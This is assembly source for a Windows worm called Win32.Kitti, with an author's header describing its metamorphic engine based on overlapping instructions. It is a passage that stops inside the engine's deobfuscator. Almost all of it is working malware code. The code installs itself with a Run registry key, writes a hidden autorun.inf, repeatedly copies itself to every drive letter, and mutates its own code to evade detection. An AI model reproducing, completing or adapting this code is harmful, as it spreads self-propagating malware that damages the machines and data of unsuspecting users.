;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;;  Win32.Kitti
;;  by SPTH
;;  July 2011
;;
;;
;;  This is a worm which spreads via network/removable/USB drives.
;;
;;  The special thing is its mutation engine, which takes use of
;;  overlapping instructions:
;;
;;          00402000 > $ 31C0           XOR EAX,EAX
;;          00402002   . 50             PUSH EAX
;;          00402003   . 31C0           XOR EAX,EAX
;;          00402005   . 31C9           XOR ECX,ECX
;;          00402007   . 41             INC ECX
;;          00402008   . 40             INC EAX
;;
;;  can be written as
;;
;;          00402000 > $ 31C0           XOR EAX,EAX
;;          00402002   . 50             PUSH EAX
;;          00402003   . 31C0           XOR EAX,EAX
;;          00402005   . 31C9           XOR ECX,ECX
;;          00402007   . 41             INC ECX
;;          00402008   . 52             PUSH EDX
;;          00402009   . 68 19204000    PUSH uxcnovgb.00402019
;;          0040200E   . 68 14204000    PUSH uxcnovgb.00402014
;;          00402013   . BA 409090C3    MOV EDX,C3909040
;;          00402018   . C3             RETN
;;          00402019   . 5A             POP EDX
;;
;;  or
;;
;;          00402000 > $ 55             PUSH EBP
;;          00402001   . 68 11204000    PUSH izyrevsb.00402011
;;          00402006   . 68 0C204000    PUSH izyrevsb.0040200C
;;          0040200B   . BD 31C090C3    MOV EBP,C390C031
;;          00402010   . C3             RETN
;;          00402011   . 5D             POP EBP
;;          00402012   . 50             PUSH EAX
;;          00402013   . 31C0           XOR EAX,EAX
;;          00402015   . 31C9           XOR ECX,ECX
;;          00402017   . 41             INC ECX
;;          00402018   . 40             INC EAX
;;
;;  or
;;
;;          00402000 > $ 31C0           XOR EAX,EAX
;;          00402002   . 50             PUSH EAX
;;          00402003   . 53             PUSH EBX
;;          00402004   . 68 14204000    PUSH szencrgt.00402014
;;          00402009   . 68 0F204000    PUSH szencrgt.0040200F
;;          0040200E   . BB 31C090C3    MOV EBX,C390C031
;;          00402013   . C3             RETN
;;          00402014   . 5B             POP EBX
;;          00402015   . 31C9           XOR ECX,ECX
;;          00402017   . 57             PUSH EDI
;;          00402018   . 68 28204000    PUSH szencrgt.00402028
;;          0040201D   . 68 23204000    PUSH szencrgt.00402023
;;          00402022   . BF 419090C3    MOV EDI,C3909041
;;          00402027   . C3             RETN
;;          00402028   . 5F             POP EDI
;;          00402029   . 40             INC EAX
;;
;;  Obviously, there are a vast variety of possibilies to improve the organism.
;;  However, I wrote this because I wanted to see its output and because I
;;  wanted some good training for a bigger kitti in the future.  :)
;;
;;
;;
;;  The engine consists of:
;;          - Deobfuscator:
;;                 undos the mutations, and restored the original form
;;
;;          - Code analyser:
;;                 analyses the register dependency of the instructions, ...
;;
;;          - Obfuscator
;;                 traces thru the code and 1/4 it changes one instruction
;;                 to a overlapped instruction; and adjusts the new jump-table
;;
;;
;;
;;  This was chilled jogging, hope I can run the full marathon soon :)
;;
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

include 'E:\Programme\FASM\INCLUDE\win32ax.inc'

.data
    DataStart:
    include 'data.inc'


macro setnumber Reg*, BigNum*, SaveECX*
{
    if BigNum<0x80
	push BigNum
	pop  Reg
    else
	xor Reg, Reg
	addnumber Reg, BigNum, SaveECX
    end if
}

macro addnumber Reg*, BigNum*, SaveECX*
{
    AlreadyStarted=0
    if BigNum<20
	repeat BigNum
	    inc Reg
	end repeat
    else
	if Reg in <ecx>

	    push eax
	    push ecx

	    xor eax, eax
	    xor ecx, ecx
	    inc ecx

	    irp num, 0x8000'0000,0x4000'0000,0x2000'0000,0x1000'0000,0x800'0000,0x400'0000,0x200'0000,0x100'0000,0x80'0000,0x40'0000,0x20'0000,0x10'0000,0x8'0000,0x4'0000,0x2'0000,0x1'0000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
	    \{
		if AlreadyStarted=1
		    shl eax, cl
		end if
		if (BigNum AND num)>0
		    inc eax
		    AlreadyStarted=1
		end if
	    \}

	    mov ecx, eax
	    pop eax
	    add ecx, eax
	    pop eax

	else

	    if SaveECX=1
		push ecx
	    end if
	    push Reg

	    xor Reg, Reg
	    xor ecx, ecx
	    inc ecx

	    irp num, 0x8000'0000,0x4000'0000,0x2000'0000,0x1000'0000,0x800'0000,0x400'0000,0x200'0000,0x100'0000,0x80'0000,0x40'0000,0x20'0000,0x10'0000,0x8'0000,0x4'0000,0x2'0000,0x1'0000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
	    \{
		if AlreadyStarted=1
		    shl Reg, cl
		end if
		if (BigNum AND num)>0
		    inc Reg
		    AlreadyStarted=1
		end if
	    \}
	    pop ecx
	    add Reg, ecx

	    if SaveECX=1
		pop ecx
	    end if
	end if
    end if
}



.code
start:
startcode:

; Will receive the addresses of all
; required APIs from kernel32.dll and advapi32.dll
; using a 16bit hash for each API name. The hash
; will be calculated with a simple XOR/SUB/ADD algorithm

		setnumber eax, NopTmp, 0
		setnumber ebx, 0x90909090, 0
		mov	  dword[eax], ebx	; write NOP Padding

		setnumber eax, "kern", 0
		setnumber ebx, _DLLkernel32, 0
		mov	  dword[ebx], eax

		setnumber eax, "el32", 0
		addnumber ebx, 4, 0
		mov	  dword[ebx], eax

		setnumber eax, ".dll", 0
		addnumber ebx, 4, 0
		mov	  dword[ebx], eax

		setnumber eax, APIMagicNumbersKernel32, 0
		setnumber ebx, APICurrentMagicNum, 0
		mov	  dword[ebx], eax

		setnumber eax, APINumbersKernel, 0
		setnumber ebx, APICurrentNumber, 0
		mov	  dword[ebx], eax

		setnumber eax, APIAddressesKernel, 0
		setnumber ebx, APICurrentAddress, 0
		mov	  dword[ebx], eax

		setnumber ebx, _DLLkernel32, 0
		push	  ebx

		setnumber ebx, LoadLibrary, 0
		stdcall   dword[ebx]

		setnumber ebx, hDLLkernel32, 0
		mov	  dword[ebx], eax
		setnumber ebx, lFindAPIsInLibrary, 0
		call	  dword[ebx]

		setnumber eax, "adva", 0
		setnumber ebx, _DLLadvapi32, 0
		mov	  dword[ebx], eax

		setnumber eax, "pi32", 0
		addnumber ebx, 4, 0
		mov	  dword[ebx], eax

		setnumber eax, ".dll", 0
		addnumber ebx, 4, 0
		mov	  dword[ebx], eax

		setnumber ebx, APICurrentMagicNum, 0
		setnumber eax, APIMagicNumbersAdvapi32, 0
		mov	dword[ebx], eax


		setnumber ebx, APICurrentNumber, 0
		setnumber eax, APINumbersAdvapi, 0
		mov	  dword[ebx], eax

		setnumber eax, APIAddressesAdvapi, 0
		setnumber ebx, APICurrentAddress, 0
		mov	  dword[ebx], eax

		setnumber eax, _DLLadvapi32, 0
		push	  eax
		setnumber eax, LoadLibrary, 0
		stdcall   dword[eax]
		setnumber ebx, hDLLkernel32, 0
		mov	  dword[ebx], eax

		setnumber ebx, lFindAPIsInLibrary, 0
		call	  dword[ebx]

		setnumber ebx, _GetTickCount, 0
		stdcall   dword[ebx]
		setnumber ebx, RandomNumber, 0
		mov	  dword[ebx], eax

		setnumber ebx, _GetCommandLineA, 0
		stdcall   dword[ebx]
		setnumber ebx, hMyFileName, 0
		mov	  dword[ebx], eax

		setnumber ecx, lFileNameIsFine, 0
		setnumber ebx, '"', 1
		push	  ebx

		push edx

		mov	  dl, byte[eax]
		cmp	  bl, dl

		pop edx

		je	  Over13
		jmp	  dword[ecx]
		Over13:

		inc	  eax
		setnumber ebx, hMyFileName, 0
		mov	  dword[ebx], eax



		setnumber ecx, lFindFileNameLoop, 0
		pop	  ebx
		FindFileNameLoop:
			inc	eax
			push	edx

			mov	dl, byte[eax]
			cmp	bl, dl

			pop	edx
		je	Over12
		jmp	dword[ecx]
		Over12:

		xor	ebx, ebx
		mov	byte[eax], bl
		FileNameIsFine:

;                invoke MessageBox, 0x0, [hMyFileName], [hMyFileName], 0x0




	xor	esi, esi
	CopyFileAndRegEntryMore:
		setnumber ebx, 26, 0
		setnumber ecx, 97, 0

		push	  ebx
		setnumber ebx, lGetRandomNumber, 1
		call	  dword[ebx]
		xor	edx, edx

		setnumber ebx, RandomNumber, 1
		mov	eax, dword[ebx]
		pop	ebx
		div	ebx

		add	edx, ecx


		mov	  eax, esi
		addnumber eax, RandomFileName, 0
		mov	  byte[eax], dl
		inc	  esi
		setnumber ebx, lCopyFileAndRegEntryMore, 0
		mov ebx, dword[ebx]
		setnumber eax, 8, 1
		cmp	  esi, eax
	jnb	Over4
	jmp	ebx
	Over4:


	mov	  ebx, esi
	addnumber ebx, RandomFileName, 0
	setnumber eax, ".exe", 0
	mov	  dword[ebx], eax

	setnumber eax, "C", 0
	setnumber ebx, (SpaceForHDC+1), 0

	mov	  byte[ebx], al
	setnumber eax, ":", 0
	inc	  ebx
	mov	  byte[ebx], al
	setnumber eax, "\", 0
	inc	  ebx
	mov	  byte[ebx], al

	push	  FALSE
	dec	  ebx
	dec	  ebx
	push	  ebx
	setnumber eax, hMyFileName, 0
	push	  dword[eax]
	setnumber eax, _CopyFileA, 0
	stdcall   dword[eax]


	setnumber eax, lMutateFile, 0

	call	  dword[eax]

	setnumber eax, stKey, 0
	setnumber ebx, "SOFT", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "WARE", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "\Mic", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "roso", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "ft\W", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "indo", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "ws\C", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "urre", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "ntVe", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "rsio", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "n\Ru", 0
	mov	  dword[eax], ebx
	addnumber eax, 0x4, 0
	setnumber ebx, "n", 0
	mov	  byte[eax], bl

	push	  0x0
	setnumber eax, hKey, 0
	push	  eax
	push	  0x0
	setnumber eax, KEY_ALL_ACCESS, 0
	push	  eax
	push	  REG_OPTION_NON_VOLATILE
	push	  0x0
	push	  0x0
	setnumber eax, stKey, 0
	push	  eax
	setnumber eax, HKEY_LOCAL_MACHINE, 0
	push	  eax
	setnumber eax, _RegCreateKeyExA, 0
	stdcall   dword[eax]

	push	16
	setnumber eax, (SpaceForHDC+1), 0
	push	eax
	push	REG_SZ
	push	0x0
	push	0x0
	setnumber eax, hKey, 0
	push	dword[eax]
	setnumber eax, _RegSetValueExA, 0
	stdcall dword[eax]

	setnumber eax, hKey, 0
	push	dword[eax]
	setnumber eax, _RegCloseKey, 0
	stdcall dword[eax]

	setnumber eax, "X:\a", 0
	setnumber ebx, stAutorunWithDrive, 0
	mov	  dword[ebx], eax

	setnumber eax, "\aut", 0
	setnumber ebx, (stAutorunWithDrive+2), 0
	mov	  dword[ebx], eax
	setnumber eax, "orun", 0
	setnumber ebx, (stAutoruninf+3), 0
	mov	  dword[ebx], eax
	setnumber eax, ".inf", 0
	setnumber ebx, (stAutoruninf+7), 0
	mov	  dword[ebx], eax

	setnumber eax, "[Aut", 0
	setnumber ebx, stAutoRunContent, 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, "orun", 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, 0x530A0D5D, 0
	mov	dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, "hell", 0			   ; !!!!!!!
	mov	dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, "Exec", 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, "ute=", 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber edx, RandomFileName, 0
	mov	eax, dword[edx]        ; Filename: XXXXxxxx.exe
	mov	dword[ebx], eax

	addnumber edx, 4, 0
	mov	  eax, dword[edx]      ; Filename: xxxxXXXX.exe
	addnumber ebx, 4, 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, ".exe", 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, 0x73550A0D, 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, "eAut", 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, "opla", 0
	mov	  dword[ebx], eax

	addnumber ebx, 4, 0
	setnumber eax, 0x00313D79, 0
	mov	  dword[ebx], eax


	; i like that coding style, roy g biv! :))
	push	  51
	push	  0x0
	push	  0x0
	setnumber eax, FILE_MAP_ALL_ACCESS, 0
	push	  eax
	push	  0x0
	push	  51
	push	  0x0
	push	  PAGE_READWRITE
	push	  0x0
	push	  0x0
	push	  FILE_ATTRIBUTE_HIDDEN
	push	  OPEN_ALWAYS
	push	  0x0
	push	  0x0
	setnumber eax, (GENERIC_READ or GENERIC_WRITE), 0
	push	  eax
	setnumber eax, stAutoruninf, 0
	push	  eax
	setnumber eax, _CreateFileA, 0
	stdcall   dword[eax]

	push	  eax
	setnumber ebx, hCreateFileAR, 0
	mov	  dword[ebx], eax
	setnumber ebx, _CreateFileMappingA, 0
	stdcall   dword[ebx]
	push	  eax
	setnumber ebx, hCreateFileMappingAR, 0
	mov	  dword[ebx], eax
	setnumber ebx, _MapViewOfFile, 0
	stdcall   dword[ebx]


	setnumber esi, stAutoRunContent, 0
	xor	ecx, ecx
	MakeAutoRunInfoMore:
		mov	bl, byte[esi]
		mov	byte[eax], bl
		inc	eax
		inc	esi
		inc	ecx
		setnumber ebx, 51, 1

		setnumber edi, lMakeAutoRunInfoMore, 1
		mov edi, dword[edi]
		cmp	ecx, ebx
	jnb	Over5
	jmp	edi
	Over5:

	addnumber eax, (0xFFFFFFCD), 0 ; -51
	setnumber ebx, hCreateFileAR, 0
	push	  dword[ebx]
	setnumber ebx, hCreateFileMappingAR, 0
	push	  dword[ebx]
	push	  eax
	setnumber ebx, _UnmapViewOfFile, 0
	stdcall   dword[ebx]
	setnumber ebx, _CloseHandle, 0
	stdcall   dword[ebx]
	stdcall   dword[ebx]



MainSpreadingLoop:
	setnumber eax, "A:\.", 0
	setnumber ebx, (SpaceForHDC2+1), 0
	mov	  dword[ebx], eax
	setnumber ebx, RandomFileName, 0
	setnumber edx, RandomFileName2, 0
	mov	  eax, dword[ebx]
	mov	  dword[edx], eax	  ; XXXXxxxx.exe
	addnumber ebx, 0x4, 0
	addnumber edx, 0x4, 0
	mov	  eax, dword[ebx]
	mov	  dword[edx], eax    ; xxxxXXXX.exe
	addnumber ebx, 0x4, 0
	addnumber edx, 0x4, 0
	mov	  eax, dword[ebx]
	mov	  dword[edx], eax    ; xxxxXXXX.exe

	setnumber eax, 0x003A4100, 0	    ; 0x0, "A:", 0x0
	setnumber ebx, SpaceForHDC2, 0
	mov	  dword[ebx], eax

    STKAnotherRound:
	setnumber eax, (SpaceForHDC2+1), 0
	push	  eax
	setnumber ebx, _GetDriveTypeA, 0
	stdcall   dword[ebx]

	xor	  ebx, ebx	  ; 0 ... No Drive
				  ; 1 ... Drive (without autorun.inf)
				  ; 2 ... Drive (with autorun.inf)

	setnumber ecx, '\', 0
	setnumber edx, (SpaceForHDC2+3), 1
	mov	byte[edx],cl


	setnumber edx, 2, 0
	setnumber ecx, lSTKWithAutoRun, 0
	cmp	  al, dl
	jne	  Over6
	jmp	  dword[ecx]
	Over6:

	inc	  dl
	setnumber ecx, lSTKWithoutAutoRun, 0
	cmp	  al, dl
	jne	  Over7
	jmp	  dword[ecx]
	Over7:

	inc	  dl
	setnumber ecx, lSTKWithAutoRun, 0
	cmp	  al, dl
	jne	  Over8
	jmp	  dword[ecx]
	Over8:


	setnumber ecx, lSTKWithAutoRun, 0
	cmp	  al, dl
	jne	  Over9
	jmp	  dword[ecx]
	Over9:

	setnumber eax, lSTKCreateEntriesForNextDrive, 0
	jmp	  dword[eax]

	STKWithAutoRun:
	push	  FALSE
	setnumber eax, stAutorunWithDrive, 0
	push	  eax
	setnumber eax, stAutoruninf, 0
	push	  eax
	setnumber eax, _CopyFileA, 0
	stdcall   dword[eax]

	STKWithoutAutoRun:
	push	  FALSE
	setnumber eax, (SpaceForHDC2+1), 0
	push	  eax
	setnumber eax, (SpaceForHDC+1), 0
	push	  eax
	setnumber eax, _CopyFileA, 0
	stdcall   dword[eax]
;        pushad
;                invoke MessageBox, 0x0, SpaceForHDC2+1, SpaceForHDC+1, 0x0
;        popad


	STKCreateEntriesForNextDrive:
	xor	  eax, eax
	setnumber ebx, (SpaceForHDC2+1), 0
	mov	  al, byte[ebx]


	setnumber ecx, lSpreadThisKittyEnd, 0
	setnumber ebx, "Z", 0
	cmp	  al, bl
	jne	  Over10
	jmp	  dword[ecx]
	Over10:

	inc	al
	setnumber ebx, (SpaceForHDC2+1), 0
	mov	byte[ebx], al	     ; next drive
	setnumber ebx, stAutorunWithDrive, 0
	mov	byte[ebx], al	     ; next drive
	setnumber ebx, (SpaceForHDC2+3), 0
	mov	byte[ebx], ah	     ; 0x0, "X:", 0x0
	setnumber eax, lSTKAnotherRound, 0


    jmp dword[eax]

    SpreadThisKittyEnd:

	setnumber eax, (1000*10), 0
	push	  eax ; 10sec
	setnumber eax, _Sleep, 0
	stdcall   dword[eax]

setnumber eax, lMainSpreadingLoop, 0
jmp	dword[eax]


; ###########################################################################
; ###########################################################################
; #####
; #####   Linear Congruent Generator (Random Number Generator)
; #####

GetRandomNumber:
		pushad
		xor	  edx, edx
		setnumber ecx, RandomNumber, 0
		mov	  eax, dword[ecx]

		setnumber ebx, 1103515245, 1
		mul	  ebx		 ; EDX:EAX = EDX:EAX * EBX

		addnumber eax, 12345, 1
		mov	  dword[ecx], eax
		popad
ret

; #####
; #####   Linear Congruent Generator (Random Number Generator)
; #####
; ###########################################################################
; ###########################################################################





; ###########################################################################
; ###########################################################################
; #####
; #####   Find addresses of APIs
; #####



FindAPIsInLibrary:
; In: eax = handle to DLL

	setnumber ecx, 0x3C, 0
	add	  ecx, eax
	mov	  ebx, dword[ecx]
	add	  ebx, eax			  ; relative -> absolut
	setnumber ecx, hKernelPE, 0
	mov	  dword[ecx], ebx


	setnumber ecx, 0x78, 0
	add	  ecx, ebx
	mov	  esi, dword[ecx]
	add	  esi, eax			  ; relative -> absolut
	addnumber esi, 0x1C, 0

	mov	  ebx, dword[esi]
	add	  ebx, eax
	setnumber ecx, hAddressTable, 0
	mov	  dword[ecx], ebx
	addnumber esi, 0x4, 0

	mov	  ebx, dword[esi]
	add	  ebx, eax			  ; relative -> absolut
	setnumber ecx, hNamePointerTable, 0
	mov	  dword[ecx], ebx
	addnumber esi, 0x4, 0

	mov	  ebx, dword[esi]
	add	  ebx, eax			  ; relative -> absolut
	setnumber ecx, hOrdinalTable, 0
	mov	  dword[ecx], ebx

	setnumber ecx, hNamePointerTable, 0
	mov	  esi, dword[ecx]
	setnumber ecx, APICurrentAddress, 0
	mov	  edi, dword[ecx]
	setnumber ecx, APICurrentMagicNum, 0
	mov	  edx, dword[ecx]

	setnumber ecx, 4, 0
	sub	esi, ecx
	xor	ebp, ebp
	dec	ebp

	xor	ecx, ecx

	FindAPIsInLibraryGetNextAPI:
	pushad
			push	  esi
		FindAPIsInLibraryNext:
			pop	  esi
			inc	  ebp
			addnumber esi, 4, 1
			mov	  ebx, dword[esi]
			push	  eax
			setnumber eax, hDLLkernel32, 1
			add	  ebx, dword[eax]
			pop	  eax

			push	  ebx
			push	  ecx
			push	  edx
			xor	  eax, eax
			xor	  ecx, ecx
			dec	  ebx
			push	  esi
			setnumber esi, lFindAPIGiveMeTheHashMore, 1
			FindAPIGiveMeTheHashMore:
				  xor	    eax, ecx
				  inc	    ebx
				  mov	    ecx, dword[ebx]
				  mov	    edx, ecx	    ; ecx=nooo - n ... new byte
				  push	    ecx
				  setnumber ecx, 24, 0
				  shr	    edx, cl	    ; edx=000n ... new byte
				  xor	    ecx, ecx
				  cmp	    dl, cl	     ; dl=n
				  pop	    ecx
			je	  Over1
			jmp	  dword[esi]
			Over1:

			pop	  esi
			sub	  al, byte[ebx]
			inc	  ebx
			add	  ah, byte[ebx]
			inc	  ebx
			xor	  al, byte[ebx]

			setnumber edx, 0xFFFF, 0
			and	  eax, edx
			pop	  edx
			pop	  ecx
			pop	  ebx

			push	esi
			setnumber esi, lFindAPIsInLibraryNext, 1

			cmp	  eax, dword[edx]
		je	Over2
		jmp	dword[esi]
		Over2:

		pop	  esi	; Trash away

		mov	  esi, ebp    ; coutner
		add	  esi, esi    ; esi*=2
	
		setnumber ebx, hOrdinalTable, 0
		add	  esi, dword[ebx]   ; esi=Pointer to ordinal table
		xor	  ebx, ebx		      ; ebx=0
		mov	  ebx, dword[esi]	      ; bx=Ordinal
		setnumber eax, 0xFFFF, 0
		and	  ebx, eax

		setnumber ecx, 0x2, 0

		shl	  ebx, cl		     ; ebx=Ordinal*4
		setnumber eax, hAddressTable, 0
		add	  ebx, dword[eax]   ; ebx=Pointer to Address of API
		mov	  ebx, dword[ebx]
		setnumber eax, hDLLkernel32, 0
		add	  ebx, dword[eax]    ; relative -> absolut
		mov	  dword[edi], ebx
	popad
	inc	  ecx
	addnumber edi, 4, 1
	addnumber edx, 4, 1
	setnumber ebx, lFindAPIsInLibraryGetNextAPI, 1
	push	  ebx
	setnumber ebx, APICurrentNumber, 1
	cmp	  ecx, dword[ebx]
	pop	  ebx

	jnb	  Over3
	jmp	  dword[ebx]
	Over3:
ret


; #####
; #####   Find addresses of APIs
; #####
; ###########################################################################
; ###########################################################################



; ###########################################################################
; ###########################################################################
; #####
; #####   Open & Close Files
; #####

OpenRandomFileWrite:
;        invoke  MessageBox, 0x0, (SpaceForHDC+1), (SpaceForHDC+1), 0x0

	push	  0x0
	setnumber eax, FILE_ATTRIBUTE_NORMAL, 0
	push	  eax
	push	  OPEN_ALWAYS
	push	  0x0
	push	  0x0
	setnumber eax, (GENERIC_READ or GENERIC_WRITE), 0
	push	  eax
	setnumber eax, (SpaceForHDC+1), 0
	push	  eax
	setnumber eax, _CreateFileA, 0
	stdcall   dword[eax]
	setnumber ebx, hCreateFileRndFile, 0
	mov	  dword[ebx], eax

	setnumber eax, dFileSize, 0
	push	  eax
	setnumber eax, hCreateFileRndFile, 0
	push	  dword[eax]
	setnumber eax, _GetFileSize, 0
	stdcall   dword[eax]

	setnumber ebx, dFileSize, 0
	mov	  dword[ebx], eax

	push	  0x0
	setnumber eax, dFileSize, 0
	push	  dword[eax]
	push	  0x0
	push	  PAGE_READWRITE
	push	  0x0
	setnumber eax, hCreateFileRndFile, 0
	push	  dword[eax]
	setnumber eax, _CreateFileMappingA, 0
	stdcall   dword[eax]

	setnumber ebx, hCreateMapRndFile, 0
	mov	  dword[ebx], eax

	setnumber eax, dFileSize, 0
	push	  dword[eax]
	push	  0x0
	push	  0x0
	push	  FILE_MAP_WRITE
	setnumber eax, hCreateMapRndFile, 0
	push	  dword[eax]
	setnumber eax, _MapViewOfFile, 0
	stdcall   dword[eax]

	setnumber ebx, hMapViewRndFile, 0
	mov	  dword[ebx], eax

	push	  eax
	addnumber eax, CodeStartInFile, 0
	setnumber ebx, WormCodeStart, 0
	mov	  dword[ebx], eax
	pop	  eax
	addnumber eax, DataStartInFile, 0
	setnumber ebx, WormDataStart, 0
	mov	  dword[ebx], eax
ret

CloseRandomFile:
	setnumber eax, hMapViewRndFile, 0
	push	  dword[eax]
	setnumber ebx, _UnmapViewOfFile, 0
	stdcall   dword[ebx]

	setnumber eax, hCreateMapRndFile,0
	setnumber ebx, _CloseHandle, 0
	push	  dword[eax]
	stdcall   dword[ebx]

	setnumber eax, hCreateFileRndFile,0
	setnumber ebx, _CloseHandle, 0
	push	  dword[eax]
	stdcall   dword[ebx]
ret



; #####
; #####   Open & Close Files
; #####
; ###########################################################################
; ###########################################################################


; ###########################################################################
; ###########################################################################
; #####
; #####   Mutate File :)))
; #####

MutateFile:
	push	  PAGE_EXECUTE_READWRITE
	setnumber eax, 0x1000, 0
	push	  eax
	setnumber eax, 0x1'0000,0
	push	  eax
	push	  0
	setnumber eax, _VirtualAlloc, 0
	stdcall   dword[eax]
	setnumber ebx, VA_BlankCode, 0
	mov	  dword[ebx], eax

	push	  PAGE_EXECUTE_READWRITE
	setnumber eax, 0x1000, 0
	push	  eax
	setnumber eax, 0x1'0000,0
	push	  eax
	push	  0
	setnumber eax, _VirtualAlloc, 0
	stdcall   dword[eax]
	setnumber ebx, VA_CodeSize, 0
	mov	  dword[ebx], eax

	push	  PAGE_EXECUTE_READWRITE
	setnumber eax, 0x1000, 0
	push	  eax
	setnumber eax, 0x1'0000,0
	push	  eax
	push	  0
	setnumber eax, _VirtualAlloc, 0
	stdcall   dword[eax]
	setnumber ebx, VA_Registers, 0
	mov	  dword[ebx], eax

	push	  PAGE_EXECUTE_READWRITE
	setnumber eax, 0x1000, 0
	push	  eax
	setnumber eax, 0x1'0000,0
	push	  eax
	push	  0
	setnumber eax, _VirtualAlloc, 0
	stdcall   dword[eax]
	setnumber ebx, InstrRestriction, 0
	mov	  dword[ebx], eax

	setnumber eax, lOpenRandomFileWrite, 0
	call dword[eax]


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; Deobfuscator
;;;

	xor ecx, ecx
	setnumber esi, WormCodeStart, 1
	mov esi, dword[esi]
	setnumber edi, VA_BlankCode, 1
	mov edi, dword[edi]
	; EBX=size of instruction


    DeobfuscateMore:
		setnumber eax, lDeobfuscate2Byte, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		and al, 1111'1101b
		cmp al, 0011'1001b	     ; cmp Reg32, Reg32 || cmp Reg32, dword[Reg32]
		jne OverDObf1
		jmp ebp
		OverDObf1:

		mov al, byte[esi]
		and al, 1111'1011b
		cmp al, 0011'1000b	     ; cmp Reg8, Reg8 || cmp al, imm
		jne OverDObfF1
		jmp ebp
		OverDObfF1:


		mov al, byte[esi]
		and al, 1100'0111b
		cmp al, 1		     ; op Reg32,Reg32
		jne OverDObf2
		jmp ebp
		OverDObf2:

		mov al, byte[esi]
		and al, 1111'1100b
		cmp al, 1000'1000b	     ; mov Reg32, Reg32 || mov dword[Reg32], Reg32 || mov Reg32, dword[Reg32] || mov Reg8, byte[Reg32] || mov byte[Reg32], Reg8
		jne OverDObf3
		jmp ebp
		OverDObf3:

		mov al, byte[esi]
		and al, 1111'1110b
		cmp al, 0000'0010b	     ; add Reg32, dword[Reg32] || add Reg8, byte[Reg32]
		jne OverDObf4
		jmp ebp
		OverDObf4:

		mov al, byte[esi]
		cmp al, 0x00		     ; add Reg8, byte[Reg32]
		jne OverDObf5
		jmp ebp
		OverDObf5:

		cmp al, 0x2A		     ; sub Reg8, byte[Reg32]
		jne OverDObf6
		jmp ebp
		OverDObf6:

		cmp al, 0x32		     ; xor Reg8, byte[Reg32]
		jne OverDObf7
		jmp ebp
		OverDObf7:

		cmp al, 0x8		     ; or byte[Reg32], Reg8
		jne OverDObf7K
		jmp ebp
		OverDObf7K:


		cmp al, 0xFE		     ; inc Reg8 || dec Reg8
		jne OverDObf8
		jmp ebp
		OverDObf8:

		and al, 1110'0111b
		cmp al, 0010'0100b	     ; (and|xor|sub|cmp) al, Imm
		jne OverDObfFF1
		jmp ebp
		OverDObfFF1:


		mov al, byte[esi]
		cmp al, 0xD3		     ; shl Reg32, cl || shr Reg32, cl
		jne OverDObf9
		jmp ebp
		OverDObf9:

		cmp al, 0xF7		     ; mul Reg32 || div Reg32
		jne OverDObf10
		jmp ebp
		OverDObf10:

		cmp al, 0xFF		     ; jmp dword[Reg32]
		jne OverDObf11
		jmp ebp
		OverDObf11:

		cmp al, 0x6A
		jne OverDObf12
		jmp ebp 		     ; push NN
		OverDObf12:

		cmp al, 0xF3
		jne OverDObf13
		jmp ebp 		     ; REP MOVSB
		OverDObf13:

		mov al, byte[esi]
		and al, 1111'1000b
		cmp al, 0111'0000b	     ; some Jxx
		jne OverDObf14
		jmp ebp
		OverDObf14:

		setnumber eax, lDeobfuscate1Byte, 1
		mov ebp, dword[eax]
		mov al, byte[esi]	     ; pushad / popad
		and al, 1111'1110b
		cmp al, 0110'0000b
		jne OverDObf15
		jmp ebp
		OverDObf15:

		mov al, byte[esi]	     ; push/pop Reg32
		and al, 1111'0000b
		cmp al, 0101'0000b
		jne OverDObf16
		jmp ebp
		OverDObf16:

		mov al, byte[esi]
		cmp al, 0xC3
		jne OverDObf17
		jmp ebp 		     ; retn
		OverDObf17:

		cmp al, 0xCC
		jne OverDObf18
		jmp ebp 		     ; int3
		OverDObf18:

		mov al, byte[esi]	     ; inc/dec Reg32
		and al, 1111'0000b
		cmp al, 0100'0000b
		jne OverDObf19
		jmp ebp
		OverDObf19:

		setnumber eax, lDeobfuscateFoundPUSH_RET, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		cmp al, 0x68
		jne OverDObf20
		jmp  ebp
		OverDObf20:



		pushad
;                invoke MessageBox, 0x0, d, d, 0x0
		 int3  ; 4xint3
		 int3
		 int3
		 int3
		popad
		mov al, byte[esi]
		int3

		Deobfuscate2Byte:
		    mov al, byte[esi]
		    mov byte[edi], al
		    inc esi
		    inc edi
		    inc ecx

		Deobfuscate1Byte:
